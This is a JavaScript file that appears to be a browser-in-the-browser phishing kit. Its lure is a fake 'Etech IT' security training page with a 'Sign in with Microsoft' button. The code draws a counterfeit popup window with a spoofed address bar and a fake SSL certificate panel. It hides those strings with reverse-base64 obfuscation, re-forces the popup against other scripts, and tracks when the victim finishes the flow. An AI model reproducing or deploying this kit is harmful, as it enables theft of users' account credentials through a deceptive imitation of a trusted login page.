
// For demo obfuscation
const PREFIX = "OBFS";
const SUFFIX = "END";

const obfEnd = 'OBFS==Qaz12aEND';



// Sizing constants
// Not efficient, but works.
const popHeight = "600px";
const popWidth = "660px";
const originalContentHeight = "500px";

const popMaximizedHeight = "600px";
const popMaximizedWidth = "900px";

const popTop = "50%";
const popLeft = "50%";
const popTransform = "translate(-50%, -50%)";

// We add an extra offset from top to make it more realistic
const popContentTransform = "translate(-50%, -50%) translateY(50px)";



function setInitialSize() {
    // Sets default/initial size and position
    $("#pop-window").css("width", popWidth);
    $("#pop-window").css("height", popHeight);
    $("#pop-window").css("top", popTop);
    $("#pop-window").css("left", popLeft);
    $("#pop-window").css("transform", popTransform);

    $("#pop-background-container").css("width", popWidth);
    $("#pop-background-container").css("height", popHeight);
    $("#pop-background-container").css("top", popTop);
    $("#pop-background-container").css("left", popLeft);
    $("#pop-background-container").css("transform", popTransform);

    $(".win-scroll").css("width", popWidth);
    $(".win-scroll").css("height", originalContentHeight);
    $(".win-scroll").css("top", popTop);
    $(".win-scroll").css("left", popLeft);
    $(".win-scroll").css("transform", popContentTransform);
}



function deobfString(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split('').reverse().join('');
  return atob(reversed);
}


function openTop() {
    $("#pop-window").css('display', "block");
    $("#pop-background-container").css('display', "block");
    deObfData();
    
    applyPositioning();
}

function openIn(){
        let checkExist = setInterval(function() {
      
        if ($('.win-scroll').length) {
                $(".win-scroll").css('display', "block");

                applyPositioning();

              // Set up a short duration recheck to combat other scripts
              let recheckDuration = 1000;  // 1 second
              let recheckStart = Date.now();
              let recheckInterval = setInterval(function() {
                 if (Date.now() - recheckStart > recheckDuration) {
                     clearInterval(recheckInterval);
                     return;
                 }
                $(".win-scroll").css('display', "block");

                applyPositioning();
              }, 50);  // recheck every 50 milliseconds
        
              clearInterval(checkExist);
          }
        }, 50);
}



function deObfData() {
    try{
        // URI Bar
        document.getElementById('pop-uri-prefix').innerText = deobfString(document.getElementById('pop-uri-prefix').innerText) + "//";
        document.getElementById('pop-uri-host').innerText = deobfString(document.getElementById('pop-uri-host').innerText);
        document.getElementById('pop-uri-path').innerText = "/" + deobfString(document.getElementById('pop-uri-path').innerText);
        
        // Rest
        document.getElementById('pop-title-text').innerText = deobfString(document.getElementById('pop-title-text').innerText);

        document.getElementById('pop-ssl-head-title').innerText = deobfString(document.getElementById('pop-ssl-head-title').innerText);
        document.getElementById('pop-ssl-text-1').innerText = deobfString(document.getElementById('pop-ssl-text-1').innerText);
        document.getElementById('pop-ssl-text-2').innerText = deobfString(document.getElementById('pop-ssl-text-2').innerText);
        document.getElementById('pop-ssl-text-3').innerText = deobfString(document.getElementById('pop-ssl-text-3').innerText);
  
    } catch {
        return;
    }
}








function handleDnDLogic() {
    //////////////// Make window draggable ////////////////
    let draggable = $('#pop-window');
    let winScroll = $('.win-scroll');
    let title = $('#pop-title-bar');

    title.on('mousedown', function(e) {

        if (!e.target.id.indexOf('pop-control') !== -1) {
        
        let dr = $(draggable).addClass("drag");
        let db = $('#pop-background-container');
        let dt = $('.win-scroll').addClass("drag");
        

        let initialDiffX = dt.offset().left - dr.offset().left;
        let initialDiffY = dt.offset().top - dr.offset().top;
        
        let ypos = e.pageY - dr.offset().top;
        let xpos = e.pageX - dr.offset().left;

        $(document.body).on('mousemove', function(e) {
            
            let itop = e.pageY - ypos;
            let ileft = e.pageX - xpos;

            if(dr.hasClass("drag")) {
                dr.offset({top: itop, left: ileft});
                db.offset({top: itop, left: ileft});
            }
            
            if(dt.hasClass("drag")) {
                dt.offset({top: itop + initialDiffY, left: ileft + initialDiffX});
            }

        }).on('mouseup', function(e) {
            
            let draggable = $('#pop-window');

            let dr = $(draggable);
            let dt = $('.win-scroll');

            if (dr.hasClass("drag")){
                dr.removeClass("drag");
                dt.removeClass("drag");
        
            let btbPosition = {
                top: dr.offset().top,
                left: dr.offset().left,
                width: dr.css('width'),
                height: dr.css('height'),
                enlarged: dr.hasClass('enlarged')
            };
        

            localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
        
            let winScrollOffset = {
                top: dt.offset().top - dr.offset().top,
                left: dt.offset().left - dr.offset().left
            };
        
            localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
            }

        });
        }
    });
}

// Function to apply positioning
function applyPositioning() {

    // Set default/initial size and position then check for modifications needed
    setInitialSize();

    let storedBtbPosition = localStorage.getItem('pop-window-position');
    let storedWinScrollOffset = localStorage.getItem('win-scroll-offset');


    if(storedBtbPosition !== null && storedWinScrollOffset !== null) {

        console.log("storedBtbPosition: ", storedBtbPosition)


        let btbPosition = JSON.parse(storedBtbPosition);
        let winOffset = JSON.parse(storedWinScrollOffset);
        
        if (btbPosition.enlarged === "true"){
            $("#pop-control-max").addClass("enlarged");
        }

        $("#pop-window").css('width', btbPosition.width);
        $("#pop-window").css('height', btbPosition.height);
        $("#pop-background-container").css('width', btbPosition.width);
        $("#pop-background-container").css('height', btbPosition.height);

        let winScrollTop = btbPosition.top + winOffset.top;
        let winScrollLeft = btbPosition.left + winOffset.left;

        $("#pop-window").offset({
            top: btbPosition.top,
            left: btbPosition.left
        });
        $("#pop-background-container").offset({
           top: btbPosition.top,
            left: btbPosition.left
      });
        $(".win-scroll").offset({
            top: winScrollTop,
            left: winScrollLeft
        });
 
    }

}



////////////////// Onclick listeners //////////////////

function closePopup(){
    $("#pop-window").css("display", "none");
    $("#pop-background-container").css("display", "none");
    $(".win-scroll").css("display", "none");
    $("#pop-ssl").removeClass("visible");
    $("#pop-ssl-icon").removeClass("visible");
    localStorage.setItem('bb-open', false);
    localStorage.removeItem('pop-window-position');
    localStorage.removeItem('win-scroll-offset');
}



function toggleSSLPopup(){
    let sslPopup = $("#pop-ssl");
    let sslIcon = $("#pop-ssl-icon");
    if (sslPopup.hasClass("visible")){
        sslPopup.removeClass("visible")
        sslIcon.removeClass("visible")
    } else {
        sslPopup.addClass("visible")
        sslIcon.addClass("visible")
    }
    
  }




function enlarge(){
    let max = document.getElementById("pop-control-max");

    if(max.classList.contains("enlarged")){
        $("#pop-window").css("width", popWidth);
        $("#pop-window").css("height", popHeight);
        $("#pop-background-container").css("width", popWidth);
        $("#pop-background-container").css("height", popHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").removeClass("enlarged");
    }
    else{
        $("#pop-window").css("width", popMaximizedWidth);
        $("#pop-window").css("height", popMaximizedHeight);
        $("#pop-background-container").css("width", popMaximizedWidth);
        $("#pop-background-container").css("height", popMaximizedHeight);
        $("#pop-title-bar-width").css('width', '100%').css('width', '+=2px');
        $("#pop-content-container").css("width", "100%");
        $("#pop-control-max").addClass("enlarged");

    }
  
    let dr = $("#pop-window");
    let dt = $(".win-scroll");
    
    let btbPosition = {
        top: dr.offset().top,
        left: dr.offset().left,
        width: dr.css('width'),
        height: dr.css('height'),
        enlarged: dr.hasClass('enlarged')
    };
    localStorage.setItem('pop-window-position', JSON.stringify(btbPosition));
  
    let winScrollOffset = {
        top: dt.offset().top - dr.offset().top,
        left: dt.offset().left - dr.offset().left
    };
    localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
}



async function setPrimaryContent(locationDivId, contentHTML, cssUrls, jsUrls){
    // Handling the landing page content this way to allow more isolation of styles and scripts
    // and enable more efficient methods that will come soon
    // Create shadowroot element and append to it HTML, CSS, JS content

    const contentDiv = document.getElementById(locationDivId);
    const shadowRoot = contentDiv.attachShadow({ mode: 'open' });

    let scriptsToLoad = jsUrls.length;

    const checkAllLoaded = () => {
        if (scriptsToLoad === 0) {
            // dispatch the event when all scripts are loaded
            const contentLoadedEvent = new Event('PrimaryContentLoaded', { bubbles: true, composed: true });
            document.dispatchEvent(contentLoadedEvent);
            console.log("Secondary Dispatched: PrimaryContentLoaded")

            // now check if the auth flow is completed and inform primary
            handleIsOpenedState(shadowRoot)
        }
    };

    // function to append CSS files
    cssUrls.forEach(url => {
        const link = document.createElement('link');
        link.href = url;
        link.type = 'text/css';
        link.rel = 'stylesheet';
        shadowRoot.appendChild(link);
    });

    // append HTML content
    shadowRoot.innerHTML += contentHTML;


    // function to append JS files
    jsUrls.forEach(url => {
        const script = document.createElement('script');
        script.src = url;
        script.type = 'text/javascript';
        script.onload = () => {
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        script.onerror = () => {
            console.error(`Error loading script: ${url}`);
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        shadowRoot.appendChild(script);
    });

    // check if there are no scripts to load
    checkAllLoaded();
}



function handleSecondaryFlowStart() {
    // triggered opening from primary, will open always
    localStorage.setItem('bb-open', true);
    openTop();
    openIn();
}

function handleIsOpenedState (shadowRoot) {

    let targetPath = '/' + deobfString(obfEnd);
    let doneAlready = localStorage.getItem('bb-done');
    let openedAlready = localStorage.getItem('bb-open');
    

    let wasOpened = openedAlready === "true";
    let isCompleted = window.location.pathname === targetPath || doneAlready;

    if (wasOpened && !isCompleted) {
        openTop();
        openIn();
    }
    // Check if we just reached the final flow page or flow was already completed
    else if (isCompleted) {
        console.log("Secondary: flow is done");
        localStorage.setItem('bb-open', false);
        localStorage.setItem('bb-done', true);
        // Inform primary page that flow is completed
        shadowRoot.dispatchEvent(new CustomEvent('secondaryFlowCompleted', {bubbles: true, composed: true}));
    }
    

}


function hadleDOMContentLoaded() {    

    // inject the primary page, then initialize it
    setPrimaryContent('primary', primaryHTML, cssURLs, jsURLs)

    // and set default size of the secondary
    setInitialSize();

    let titleBar = document.getElementById("pop-title-bar");
    let exit = document.getElementById("pop-control-esc");
    let max = document.getElementById("pop-control-max");
    let min = document.getElementById("pop-control-min");
    let sslIcon = document.getElementById('pop-ssl-icon');
    let sslIconExit = document.getElementById('pop-ssl-head-esc');


    titleBar.addEventListener('dblclick', function handleMouseOver() {
        enlarge();
    });
    
    titleBar.addEventListener('mouseout', function handleMouseOver() {
      titleBar.style.cursor = 'default';
    });

    exit.addEventListener('click', closePopup);
    min.addEventListener('click', closePopup);
    max.addEventListener('click', enlarge);

    sslIcon.addEventListener('click', toggleSSLPopup);
    sslIconExit.addEventListener('click', toggleSSLPopup);


    handleDnDLogic();

}

document.addEventListener('DOMContentLoaded', hadleDOMContentLoaded);

document.addEventListener('secondaryFlowStart', handleSecondaryFlowStart)



// Content for the landing page (aka primary page)

const cssURLs = ['https://assets.calendly.com/assets/external/widget.css', '/primary/styles.css']
const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/primary/script.js']

const primaryHTML = `
    <header>
    <div id="logo">Etech IT</div>
    <nav>
        <a href="#">Home</a>
        <a href="#">Services</a>
        <a href="#">About</a>
        <a href="#">Contact</a>
    </nav>
    <div id="contact">Contact us: +1 (123) 456-7890</div>
    </header>
    <main>
    <section id="hero">
        <h1>Welcome to Etech IT - Cybersecurity Solutions</h1>
        
        <p>Your trusted partner in cybersecurity solutions.</p>
    </section>
    <section id="registration-form-section">
        <section id="training-info">
            <h2>Upcoming Security Awareness Training</h2>
            
            <p>Join our exclusive 1:1 training session to enhance your security skills and awareness.</p>
            
        </section>
        <div id="primary-overlay-container">
            <div id="paywall-modal">
                <h3 id="lg-h">This training is exclusive for enterprise customers</h3>
                <p id="lg-p">If you received an invitation, please login to continue.</p>
                
                <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
            </div>
        </div>
        <iframe id="calendly-frame" src="" frameBorder="0" width="100%" height="100%" title="Select Date & Time - Etech-it.com"></iframe>
    </section>
    </main>
    <footer>
    <p>&copy; 2023 Etech IT. All rights reserved.</p>
    <nav>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
    </nav>
    </footer>
`